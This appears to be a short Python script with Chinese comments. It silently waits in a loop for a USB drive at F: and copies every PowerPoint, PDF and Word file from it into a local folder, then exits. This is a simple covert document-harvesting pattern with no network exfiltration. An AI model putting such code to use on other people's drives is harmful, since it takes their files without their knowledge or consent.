import os
import shutil

# with open('test.txt', 'w') as f:
#     f.write(str(list(os.walk('G:'))))

# u盘的盘符
USB_PATH = 'F:'

# 保存的目标目录
TARGET_PATH = 'c:/save_file'
if not os.path.isdir(TARGET_PATH):
    os.mkdir(TARGET_PATH)

EXTENSION = ['.ppt', '.pptx', '.pdf', '.doc', '.docx']

def usb_copy():
    if not os.path.isdir(USB_PATH):
        # print('[Error]: 请插入 u盘')
        return 
    else:
        usb_walk = os.walk(USB_PATH)            # os.walk()是目录遍历函数
        for file_walk in usb_walk:
            file_root = file_walk[0]            # 当前文件的目录        
            file_files = file_walk[2]           # 当前目录内所有文件

            for file in file_files:
                file = file_root + '/' + file   # 文件名

                if os.path.splitext(file)[-1] in EXTENSION:
                    # 判断是否是目标扩展名文件
                    # 是则copy一份
                    shutil.copy(file, TARGET_PATH)

        exit()  # 复制完就退出了

if __name__ == '__main__':
    while True:
        usb_copy()


